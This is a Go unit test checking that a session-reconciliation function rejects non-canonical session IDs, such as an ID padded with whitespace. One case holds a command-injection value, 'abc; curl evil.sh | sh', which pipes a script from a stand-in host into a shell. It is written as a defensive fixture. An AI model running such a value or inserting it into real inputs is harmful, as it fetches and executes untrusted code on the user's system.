package codexreconcile

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/ahmojo/codex-claude-transfer/internal/bundle"
	"github.com/ahmojo/codex-claude-transfer/internal/codexhome"
)

func TestThreadsChangedByImportRejectsNonCanonicalSessionMetaID(t *testing.T) {
	tests := []struct {
		name string
		id   string
	}{
		{name: "shell payload", id: "abc; curl evil.sh | sh"},
		{name: "UUID with surrounding whitespace", id: " aaaaaaaa-1111-4111-8111-111111111111 "},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			home, err := codexhome.Detect(root)
			if err != nil {
				t.Fatal(err)
			}
			dest := filepath.Join(home.SessionsDir, "2026", "07", "25",
				"rollout-2026-07-25T12-00-00-aaaaaaaa-1111-4111-8111-111111111111.jsonl")
			if err := os.MkdirAll(filepath.Dir(dest), 0o755); err != nil {
				t.Fatal(err)
			}
			body := `{"type":"session_meta","payload":{"id":"` + tt.id + `","cwd":"/tmp/project","source":"cli"}}` + "\n"
			if err := os.WriteFile(dest, []byte(body), 0o644); err != nil {
				t.Fatal(err)
			}

			changed, err := ThreadsChangedByImport(home, bundle.ImportResult{
				Items: []bundle.ImportItem{{DestPath: dest, Action: bundle.ActionImport}},
			})
			if err != nil {
				t.Fatal(err)
			}
			if len(changed.IDs) != 0 {
				t.Fatalf("untrusted session_meta.id reached reconciliation: %#v", changed.IDs)
			}
			if changed.Unknown != 1 {
				t.Fatalf("unknown = %d, want 1", changed.Unknown)
			}
		})
	}
}
